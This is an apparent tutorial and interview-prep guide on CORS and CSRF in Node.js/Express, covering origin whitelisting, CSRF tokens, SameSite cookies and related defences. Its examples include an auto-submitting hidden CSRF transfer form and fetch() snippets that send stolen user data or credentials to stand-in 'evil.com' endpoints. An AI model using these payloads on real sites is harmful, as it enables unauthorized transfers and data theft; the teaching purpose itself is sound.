# CORS & CSRF

## Overview

**CORS (Cross-Origin Resource Sharing)** and **CSRF (Cross-Site Request Forgery)** are two critical web security concepts that are often confused but address different problems. Understanding both is essential for building secure web applications.

**Key Principle:** CORS controls which domains can access your API. CSRF protects against unauthorized actions using a user's authenticated session.

---

## 🌐 CORS (Cross-Origin Resource Sharing)

### 💡 **What is CORS?**

**CORS** is a browser security feature that restricts web pages from making requests to a different domain than the one serving the page.

**The Same-Origin Policy:**

```javascript
// Same Origin (Allowed by default)
https://example.com/page1  →  https://example.com/api/users  ✅

// Different Origin (Blocked without CORS)
https://example.com  →  https://api.example.com  ❌
https://example.com  →  http://example.com      ❌ (different protocol)
https://example.com  →  https://example.com:3000 ❌ (different port)
```

**What Counts as Different Origin:**
- Different domain: `example.com` vs `api.example.com`
- Different protocol: `http` vs `https`
- Different port: `:80` vs `:3000`

---

## 🔍 How CORS Works

### Preflight Request

For complex requests (non-simple), the browser sends a preflight OPTIONS request first.

```
┌─────────────┐                           ┌─────────────┐
│   Browser   │                           │   Server    │
│ example.com │                           │ api.com     │
└─────────────┘                           └─────────────┘
       │                                         │
       │  1. Preflight (OPTIONS)                 │
       ├────────────────────────────────────────▶│
       │  Origin: https://example.com            │
       │  Access-Control-Request-Method: POST    │
       │  Access-Control-Request-Headers: ...    │
       │                                         │
       │  2. Preflight Response                  │
       ◀────────────────────────────────────────┤
       │  Access-Control-Allow-Origin: *         │
       │  Access-Control-Allow-Methods: POST     │
       │  Access-Control-Allow-Headers: ...      │
       │                                         │
       │  3. Actual Request (POST)               │
       ├────────────────────────────────────────▶│
       │  Origin: https://example.com            │
       │                                         │
       │  4. Response                            │
       ◀────────────────────────────────────────┤
       │  Access-Control-Allow-Origin: *         │
```

### Simple vs Complex Requests

**Simple Requests (No Preflight):**
- Methods: `GET`, `HEAD`, `POST`
- Headers: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

**Complex Requests (Preflight Required):**
- Methods: `PUT`, `DELETE`, `PATCH`, custom methods
- Custom headers: `Authorization`, `X-Custom-Header`
- Content-Type: `application/json`

---

## 🛠 CORS Implementation (Node.js/Express)

### Basic CORS Setup

```bash
npm install cors
```

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// Enable CORS for all routes
app.use(cors());

app.get('/api/data', (req, res) => {
  res.json({ message: 'CORS enabled for all origins' });
});

app.listen(3000);
```

### Restrict to Specific Origins

```javascript
const cors = require('cors');

// Whitelist specific origins
const allowedOrigins = [
  'https://example.com',
  'https://app.example.com',
  'http://localhost:3000', // Development
];

const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true, // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Number'],
  maxAge: 86400, // Cache preflight for 24 hours
};

app.use(cors(corsOptions));
```

### Manual CORS Implementation

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = [
    'https://example.com',
    'https://app.example.com',
  ];

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader(
    'Access-Control-Allow-Methods',
    'GET, POST, PUT, DELETE, OPTIONS'
  );

  res.setHeader(
    'Access-Control-Allow-Headers',
    'Content-Type, Authorization'
  );

  res.setHeader('Access-Control-Allow-Credentials', 'true');

  res.setHeader('Access-Control-Max-Age', '86400');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }

  next();
});
```

### Environment-Based CORS

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

const corsOptions = {
  origin:
    process.env.NODE_ENV === 'production'
      ? ['https://example.com', 'https://app.example.com']
      : '*', // Allow all in development

  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
};

app.use(cors(corsOptions));
```

### Route-Specific CORS

```javascript
const cors = require('cors');

// Public API - allow all origins
app.get('/api/public/data', cors(), (req, res) => {
  res.json({ data: 'Public data' });
});

// Private API - restrict origins
const privateCors = cors({
  origin: 'https://app.example.com',
  credentials: true,
});

app.post('/api/private/data', privateCors, authenticate, (req, res) => {
  res.json({ data: 'Private data' });
});
```

---

## 🛡️ CSRF (Cross-Site Request Forgery)

### 💡 **What is CSRF?**

**CSRF** is an attack where a malicious site tricks a user's browser into making unwanted requests to a site where the user is authenticated.

**CSRF Attack Example:**

```html
<!-- Malicious website: evil.com -->
<html>
<body>
  <h1>You Won a Prize!</h1>

  <!-- Hidden form that submits to bank.com -->
  <form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
  </form>

  <script>
    // Auto-submit form
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

**What Happens:**
1. User is logged into `bank.com` (has session cookie)
2. User visits `evil.com`
3. `evil.com` submits form to `bank.com`
4. Browser automatically sends `bank.com` cookies
5. Transfer executes without user's knowledge

**Key Insight:**
> CSRF exploits the fact that browsers automatically send cookies with every request to a domain, even if the request originates from a different site.

---

## 🔐 CSRF Protection Methods

### 1. CSRF Tokens (Synchronizer Token Pattern)

**Most Common and Secure:**

```bash
npm install csurf cookie-parser
```

```javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();

// Setup
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// CSRF protection
const csrfProtection = csrf({ cookie: true });

// Get CSRF token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected route - requires CSRF token
app.post('/api/transfer', csrfProtection, (req, res) => {
  const { to, amount } = req.body;

  // Process transfer (safe from CSRF)
  res.json({ message: 'Transfer successful' });
});

// Error handler for CSRF
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next(err);
});

app.listen(3000);
```

**Frontend Implementation:**

```javascript
// React/Vue/Angular example
import axios from 'axios';

// 1. Get CSRF token on app load
async function getCsrfToken() {
  const response = await axios.get('/api/csrf-token');
  return response.data.csrfToken;
}

// 2. Include token in requests
async function makeProtectedRequest() {
  const csrfToken = await getCsrfToken();

  // Option A: In request header
  await axios.post(
    '/api/transfer',
    { to: 'account123', amount: 100 },
    {
      headers: {
        'X-CSRF-Token': csrfToken,
      },
    }
  );

  // Option B: In request body
  await axios.post('/api/transfer', {
    to: 'account123',
    amount: 100,
    _csrf: csrfToken,
  });
}
```

### 2. SameSite Cookie Attribute

**Modern and Simple:**

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict', // or 'lax'
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
    },
  })
);
```

**SameSite Values:**

| Value | Behavior | Use Case |
|-------|----------|----------|
| **Strict** | Never sent on cross-site requests | Highest security |
| **Lax** | Sent on top-level navigation (GET) | Balance security & usability |
| **None** | Always sent (requires Secure flag) | Third-party cookies |

```javascript
// Strict: Maximum protection
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Never sent cross-site
});

// Lax: Better UX (allows normal links)
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax', // Sent on top-level navigation
});
```

### 3. Double Submit Cookie

**Token stored in cookie and sent separately:**

```javascript
const crypto = require('crypto');
const express = require('express');

const app = express();

// Middleware to generate and verify CSRF token
function csrfProtection(req, res, next) {
  if (req.method === 'GET') {
    // Generate token for GET requests
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf-token', token, {
      httpOnly: false, // JS needs to read it
      secure: true,
      sameSite: 'strict',
    });
    return next();
  }

  // Verify token for state-changing requests
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

app.use(csrfProtection);

app.get('/api/form', (req, res) => {
  res.json({ message: 'CSRF token set in cookie' });
});

app.post('/api/submit', (req, res) => {
  res.json({ message: 'Submitted successfully' });
});
```

**Frontend:**

```javascript
// Get token from cookie
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

// Send in header
const csrfToken = getCookie('csrf-token');
await fetch('/api/submit', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify({ data: 'value' }),
});
```

### 4. Custom Headers (for APIs)

**Exploit: Same-Origin Policy blocks custom headers in CSRF:**

```javascript
// Backend: Require custom header
app.use((req, res, next) => {
  // Skip for GET requests
  if (req.method === 'GET') return next();

  // Require custom header for state-changing requests
  const customHeader = req.headers['x-requested-with'];

  if (customHeader !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  next();
});

// Frontend: Add custom header
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest', // Required
  },
  body: JSON.stringify({ data: 'value' }),
});
```

---

## 🔄 CORS + CSRF Together

### Complete Secure Setup

```javascript
const express = require('express');
const cors = require('cors');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const session = require('express-session');

const app = express();

// 1. CORS Configuration
const corsOptions = {
  origin: ['https://example.com', 'https://app.example.com'],
  credentials: true, // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
};

app.use(cors(corsOptions));

// 2. Body Parsing
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// 3. Session with SameSite
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax', // CSRF protection
      maxAge: 24 * 60 * 60 * 1000,
    },
  })
);

// 4. CSRF Protection
const csrfProtection = csrf({ cookie: true });

// 5. Get CSRF token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// 6. Protected routes
app.post('/api/data', csrfProtection, (req, res) => {
  res.json({ message: 'Protected by both CORS and CSRF' });
});

// 7. Error handling
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next(err);
});

app.listen(3000);
```

---

## 📚 Interview Questions

### Q1: What is CORS and why does it exist?

**Answer:**

**CORS (Cross-Origin Resource Sharing)** is a security mechanism that allows servers to control which domains can access their resources.

**Why CORS Exists:**

Without CORS, any website could make requests to your API and steal data:

```javascript
// Without CORS protection:
// evil.com could do this:
fetch('https://bank.com/api/account-balance')
  .then(res => res.json())
  .then(data => {
    // Send victim's balance to attacker
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

**Same-Origin Policy (SOP):**

The browser's default security model that blocks cross-origin requests:

```javascript
// Current page: https://example.com

// Same Origin - Allowed
fetch('https://example.com/api/data') ✅

// Different Origin - Blocked by SOP
fetch('https://api.example.com/data') ❌
fetch('http://example.com/data')     ❌ (different protocol)
fetch('https://example.com:3000/data') ❌ (different port)
```

**How CORS Works:**

Server explicitly allows specific origins:

```javascript
// Server allows example.com to access API
res.setHeader('Access-Control-Allow-Origin', 'https://example.com');
res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**Preflight Request:**

For complex requests, browser sends OPTIONS request first:

```
Browser:  OPTIONS /api/data
          Origin: https://example.com
          Access-Control-Request-Method: POST
          Access-Control-Request-Headers: Authorization

Server:   200 OK
          Access-Control-Allow-Origin: https://example.com
          Access-Control-Allow-Methods: POST
          Access-Control-Allow-Headers: Authorization

Browser:  POST /api/data (actual request)
```

**When CORS is Needed:**

```javascript
// Frontend: https://example.com
// Backend: https://api.example.com (different domain)

// Without CORS - Blocked
fetch('https://api.example.com/data')
// Error: No 'Access-Control-Allow-Origin' header

// With CORS - Allowed
// Server sends: Access-Control-Allow-Origin: https://example.com
fetch('https://api.example.com/data') ✅
```

**Common CORS Headers:**

| Header | Purpose | Example |
|--------|---------|---------|
| `Access-Control-Allow-Origin` | Allowed origins | `https://example.com` or `*` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed custom headers | `Content-Type, Authorization` |
| `Access-Control-Allow-Credentials` | Allow cookies | `true` |
| `Access-Control-Max-Age` | Cache preflight | `86400` (24 hours) |

**Key Insight:**
> CORS exists to protect users from malicious sites stealing their data. It's enforced by browsers, not servers. Without CORS, any website could access your APIs and steal user data.

---

### Q2: What is CSRF and how do you prevent it?

**Answer:**

**CSRF (Cross-Site Request Forgery)** is an attack where a malicious site tricks a user's browser into making unwanted requests to a site where they're authenticated.

**How CSRF Works:**

```html
<!-- Victim is logged into bank.com -->
<!-- Visits evil.com, which contains: -->

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>

<script>
  // Auto-submit form
  document.forms[0].submit();
</script>
```

**What Happens:**
1. User logged into `bank.com` (has session cookie)
2. User visits `evil.com`
3. `evil.com` submits form to `bank.com`
4. **Browser automatically includes `bank.com` cookies**
5. Transfer executes without user's knowledge

**Why It Works:**

Browsers automatically send cookies with every request, even from other sites:

```javascript
// User's session cookie
Cookie: sessionId=abc123

// evil.com makes request to bank.com
// Browser AUTOMATICALLY includes the cookie
POST /transfer
Cookie: sessionId=abc123  // Sent automatically!
```

**Prevention Methods:**

**1. CSRF Tokens (Best Method):**

```javascript
// Server generates unique token per session
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// Send token to client
res.render('form', { csrfToken });

// Client includes token in form
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="amount" value="100">
  <button>Transfer</button>
</form>

// Server verifies token
if (req.body._csrf !== req.session.csrfToken) {
  return res.status(403).send('Invalid CSRF token');
}
```

**Why it works:** Attacker can't get the CSRF token (SOP blocks reading from other domains)

**2. SameSite Cookie Attribute:**

```javascript
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Browser won't send cookie cross-site
});
```

**SameSite Options:**

```javascript
// Strict: Never sent cross-site (most secure)
sameSite: 'strict'
// Bank.com cookie not sent when clicking link from evil.com

// Lax: Sent on top-level navigation (balanced)
sameSite: 'lax'
// Sent when user clicks link, not from form/AJAX

// None: Always sent (requires Secure)
sameSite: 'none', secure: true
// For third-party cookies (tracking, etc.)
```

**3. Double Submit Cookie:**

```javascript
// Set token in cookie
res.cookie('csrf-token', token, { httpOnly: false });

// Require token in header
app.post('/transfer', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];

  if (cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }

  // Process request
});
```

**4. Custom Headers (APIs only):**

```javascript
// Require custom header
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Forbidden');
  }
  // Process request
});
```

**Why it works:** CORS blocks custom headers in cross-origin requests

**5. Referer/Origin Header Validation:**

```javascript
app.post('/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;

  if (!origin || !origin.startsWith('https://bank.com')) {
    return res.status(403).send('Invalid origin');
  }

  // Process request
});
```

**Comparison:**

| Method | Security | Complexity | Browser Support |
|--------|----------|------------|-----------------|
| **CSRF Tokens** | ✅ High | Medium | All |
| **SameSite Cookies** | ✅ High | Low | Modern (95%+) |
| **Double Submit** | ✅ Good | Medium | All |
| **Custom Headers** | ✅ Good | Low | All (APIs only) |
| **Referer Validation** | ⚠️ Moderate | Low | All (unreliable) |

**Best Practice:**

Use **SameSite=Lax/Strict** + **CSRF tokens** for state-changing operations:

```javascript
// Session cookie with SameSite
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax', // First line of defense
});

// CSRF token for state-changing requests
app.post('/transfer', csrfProtection, (req, res) => {
  // Second line of defense
  // Process transfer
});
```

**Key Insight:**
> CSRF exploits automatic cookie sending. Prevent with CSRF tokens (attacker can't get them) or SameSite cookies (browser won't send them cross-site).

---

### Q3: What's the difference between CORS and CSRF?

**Answer:**

CORS and CSRF are often confused but address completely different problems:

| Aspect | CORS | CSRF |
|--------|------|------|
| **Full Name** | Cross-Origin Resource Sharing | Cross-Site Request Forgery |
| **Type** | Security mechanism | Attack vector |
| **Purpose** | Allow controlled cross-origin access | Prevent unauthorized cross-origin actions |
| **Problem** | Same-Origin Policy too restrictive | Browsers automatically send cookies |
| **Enforced By** | Browser | Server |
| **Protects** | Server resources | User actions |
| **Solution Type** | Enables access | Blocks attacks |

**CORS (Access Control):**

**Problem:** You WANT different origins to access your API

```javascript
// Frontend: https://example.com
// Backend: https://api.example.com

// Without CORS - Blocked
fetch('https://api.example.com/data')
// Error: No 'Access-Control-Allow-Origin' header

// With CORS - Allowed
// Server explicitly allows example.com
res.setHeader('Access-Control-Allow-Origin', 'https://example.com');
```

**CORS is about:** "Can this origin access my API?"

**CSRF (Attack Prevention):**

**Problem:** You DON'T WANT malicious sites making requests on behalf of users

```html
<!-- User logged into bank.com, visits evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- Browser automatically sends bank.com cookies! -->
```

**CSRF is about:** "Is this request intentional or an attack?"

**Visual Comparison:**

```
CORS Example:
┌──────────────┐                    ┌──────────────┐
│ example.com  │  ─── fetch() ────▶ │ api.example  │
│  (origin A)  │                    │  (origin B)  │
└──────────────┘                    └──────────────┘
                ❌ Blocked by Same-Origin Policy
                ✅ Allowed with CORS headers

CSRF Example:
┌──────────────┐                    ┌──────────────┐
│  evil.com    │  ─── form POST ──▶ │  bank.com    │
│ (attacker)   │     + cookies      │ (victim site)│
└──────────────┘                    └──────────────┘
                ❌ Should be blocked by CSRF protection
                ✅ Cookies sent automatically (problem!)
```

**Real-World Scenarios:**

**Scenario 1: Public API**
```javascript
// Your API at api.example.com
// Multiple frontends: example.com, app.example.com, mobile apps

// CORS: Allow specific origins
res.setHeader('Access-Control-Allow-Origin', 'https://example.com');

// CSRF: Not a concern (read-only API)
// No state-changing operations
```

**Scenario 2: Banking App**
```javascript
// Frontend: bank.com
// Backend: api.bank.com

// CORS: Allow bank.com only
const corsOptions = {
  origin: 'https://bank.com',
  credentials: true
};

// CSRF: Critical protection
app.use(csrf());
app.post('/transfer', csrfProtection, (req, res) => {
  // Verify CSRF token
});
```

**When You Need Each:**

**CORS Needed:**
- ✅ Frontend and backend on different domains
- ✅ Multiple frontends (web, mobile web)
- ✅ Third-party API access
- ❌ Same domain (no CORS needed)

**CSRF Protection Needed:**
- ✅ Cookie-based authentication
- ✅ State-changing operations (POST, PUT, DELETE)
- ✅ Traditional session-based apps
- ❌ Stateless APIs (JWT in header, no cookies)

**Can You Have Both?**

Yes! Common in production:

```javascript
// CORS: Control which origins access API
app.use(cors({
  origin: ['https://example.com'],
  credentials: true
}));

// CSRF: Prevent unauthorized actions
app.use(csrf({ cookie: true }));

app.post('/transfer', csrfProtection, (req, res) => {
  // Protected by both CORS and CSRF
});
```

**Quick Decision Tree:**

```
Q: Do frontend and backend have different origins?
├─ Yes → Need CORS
└─ No → CORS not needed

Q: Using cookie-based auth with state-changing operations?
├─ Yes → Need CSRF protection
└─ No (JWT in header) → CSRF not needed
```

**Key Insight:**
> CORS = "Allow" mechanism (enables cross-origin access). CSRF = "Prevent" mechanism (blocks unauthorized actions). Different problems, different solutions, often used together.

---

### Q4: How do you implement CSRF protection for a REST API?

**Answer:**

**CSRF protection for REST APIs depends on authentication method:**

**Scenario 1: Token-Based Auth (JWT in Header) - No CSRF Protection Needed**

```javascript
// ✅ Safe from CSRF
// JWT in Authorization header

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${jwtToken}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ amount: 100 })
});

// Why safe:
// 1. Token not automatically sent (not a cookie)
// 2. Attacker can't get token (SOP blocks reading)
// 3. Attacker can't set Authorization header cross-origin (CORS)
```

**No CSRF protection needed** because:
- JWT stored in memory/localStorage (not cookies)
- Requires manual inclusion in header
- CORS blocks cross-origin custom headers

**Scenario 2: Cookie-Based Auth - CSRF Protection Required**

```javascript
// ❌ Vulnerable to CSRF
// Session cookie sent automatically

fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include', // Sends cookies
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ amount: 100 })
});

// Vulnerable because:
// Browser automatically includes cookies
// Attacker can make request from evil.com
```

**Solution 1: CSRF Tokens (Recommended)**

```javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();

app.use(express.json());
app.use(cookieParser());

// CSRF protection for cookie-based auth
const csrfProtection = csrf({ cookie: true });

// Endpoint to get CSRF token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected API endpoint
app.post('/api/transfer', csrfProtection, (req, res) => {
  const { amount, to } = req.body;

  // Process transfer (protected from CSRF)
  res.json({ success: true });
});

// Error handling
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next(err);
});
```

**Frontend:**

```javascript
// Get CSRF token once on app load
let csrfToken = null;

async function initializeCsrf() {
  const response = await fetch('/api/csrf-token', {
    credentials: 'include'
  });
  const data = await response.json();
  csrfToken = data.csrfToken;
}

// Include in all state-changing requests
async function makeTransfer(amount, to) {
  await fetch('/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ amount, to })
  });
}

// Initialize on app load
initializeCsrf();
```

**Solution 2: SameSite Cookies (Modern Approach)**

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict', // CSRF protection
      maxAge: 24 * 60 * 60 * 1000
    }
  })
);

app.post('/api/transfer', authenticate, (req, res) => {
  // Protected by SameSite cookie
  res.json({ success: true });
});
```

**SameSite values:**

```javascript
// Strict: Never sent cross-site (highest security)
sameSite: 'strict'

// Lax: Sent on top-level navigation (balanced)
sameSite: 'lax'

// None: Always sent (requires Secure, for third-party)
sameSite: 'none', secure: true
```

**Solution 3: Custom Header Verification**

```javascript
// Require custom header for all state-changing requests
app.use((req, res, next) => {
  // Skip for safe methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  // Verify custom header
  const requestedWith = req.headers['x-requested-with'];
  if (requestedWith !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  next();
});

// Frontend
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // Required
  },
  body: JSON.stringify({ amount: 100 })
});
```

**Solution 4: Double Submit Cookie**

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  if (req.method === 'GET') {
    // Set CSRF token in cookie
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf-token', token, {
      httpOnly: false, // JS needs to read it
      secure: true,
      sameSite: 'strict'
    });
  } else {
    // Verify token matches
    const cookieToken = req.cookies['csrf-token'];
    const headerToken = req.headers['x-csrf-token'];

    if (!cookieToken || cookieToken !== headerToken) {
      return res.status(403).json({ error: 'CSRF validation failed' });
    }
  }

  next();
});
```

**Best Practice for REST APIs:**

| Auth Method | CSRF Protection |
|-------------|-----------------|
| **JWT in Authorization header** | ✅ Not needed (safe by design) |
| **JWT in cookie** | ❌ Need CSRF protection |
| **Session cookie** | ❌ Need CSRF protection |
| **OAuth token in header** | ✅ Not needed |

**Recommended Approach:**

```javascript
// REST API with JWT (no CSRF needed)
app.post('/api/transfer', authenticateJWT, (req, res) => {
  // JWT from Authorization header
  // Safe from CSRF
});

// REST API with session cookies (CSRF needed)
app.post('/api/transfer',
  authenticate,      // Session-based auth
  csrfProtection,    // CSRF protection
  (req, res) => {
    // Protected from CSRF
  }
);
```

**Key Insight:**
> JWT in header = No CSRF needed. Cookies (session/JWT) = Need CSRF protection. Use SameSite cookies + CSRF tokens for defense-in-depth.

---

### Q5: What are the security implications of using `Access-Control-Allow-Origin: *`?

**Answer:**

**`Access-Control-Allow-Origin: *`** allows ANY website to access your API. This has serious security implications.

**The Risk:**

```javascript
// Your API
res.setHeader('Access-Control-Allow-Origin', '*');

// Now evil.com can access your API:
// evil.com/steal.js
fetch('https://yourapi.com/api/user-data')
  .then(res => res.json())
  .then(data => {
    // Send victim's data to attacker
    fetch('https://evil.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

**Specific Problems:**

**1. Data Exposure:**

```javascript
// Public API endpoint
app.get('/api/users', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');

  // ❌ Any website can read user data
  res.json(users);
});
```

**2. Cannot Use Credentials:**

```javascript
// ❌ Invalid - can't use * with credentials
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
// Error: Cannot use wildcard with credentials
```

**3. No Protection from Malicious Sites:**

```html
<!-- evil.com can embed your API in their page -->
<script>
  // If user is logged into your site, this works
  fetch('https://yourapi.com/api/sensitive-data')
    .then(res => res.json())
    .then(data => sendToAttacker(data));
</script>
```

**When `*` is Safe:**

**✅ Public, read-only APIs:**

```javascript
// Weather API
app.get('/api/weather/:city', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');

  // Public data, no authentication
  res.json({ temp: 72, conditions: 'sunny' });
});

// Public CDN assets
app.get('/assets/:file', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.sendFile(file);
});
```

**❌ When NOT to Use `*`:**

```javascript
// ❌ Authenticated endpoints
app.get('/api/user/profile', authenticate, (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*'); // BAD!
  res.json(req.user);
});

// ❌ Sensitive data
app.get('/api/user/credit-cards', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*'); // BAD!
  res.json(creditCards);
});

// ❌ Write operations
app.post('/api/user/transfer', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*'); // BAD!
  processTransfer(req.body);
});
```

**Secure Alternative - Whitelist Origins:**

```javascript
const allowedOrigins = [
  'https://example.com',
  'https://app.example.com',
  'https://admin.example.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
```

**Dynamic Origin Validation:**

```javascript
const cors = require('cors');

const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);

    // Check if origin is allowed
    const allowedDomains = ['example.com', 'app.example.com'];
    const originDomain = new URL(origin).hostname;

    if (allowedDomains.includes(originDomain)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
};

app.use(cors(corsOptions));
```

**Environment-Based:**

```javascript
const corsOptions = {
  origin:
    process.env.NODE_ENV === 'production'
      ? ['https://example.com', 'https://app.example.com']
      : '*', // Allow all in development

  credentials: process.env.NODE_ENV === 'production'
};

app.use(cors(corsOptions));
```

**Attack Scenarios:**

**Scenario 1: Data Theft**
```javascript
// evil.com
// User visits evil.com while logged into yoursite.com

fetch('https://yoursite.com/api/user/data')
  .then(res => res.json())
  .then(data => {
    // Steal user data
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });

// Works because: Access-Control-Allow-Origin: *
```

**Scenario 2: Phishing**
```javascript
// evil.com creates fake login page
// Uses your API to validate credentials

fetch('https://yoursite.com/api/login', {
  method: 'POST',
  body: JSON.stringify({ email, password })
})
  .then(res => {
    if (res.ok) {
      // Valid credentials - send to attacker
      sendToAttacker(email, password);
    }
  });
```

**Best Practices:**

| Scenario | CORS Policy |
|----------|-------------|
| **Public API** | `*` (safe) |
| **Authenticated API** | Specific origins |
| **Sensitive data** | Specific origins + credentials |
| **Internal API** | No CORS (same origin) |
| **Development** | `*` or localhost |
| **Production** | Strict whitelist |

**Secure Configuration:**

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// Public endpoints
app.get('/api/public/weather', cors(), (req, res) => {
  res.json({ temp: 72 }); // OK to use default (*)
});

// Private endpoints
const privateCors = cors({
  origin: ['https://example.com'],
  credentials: true,
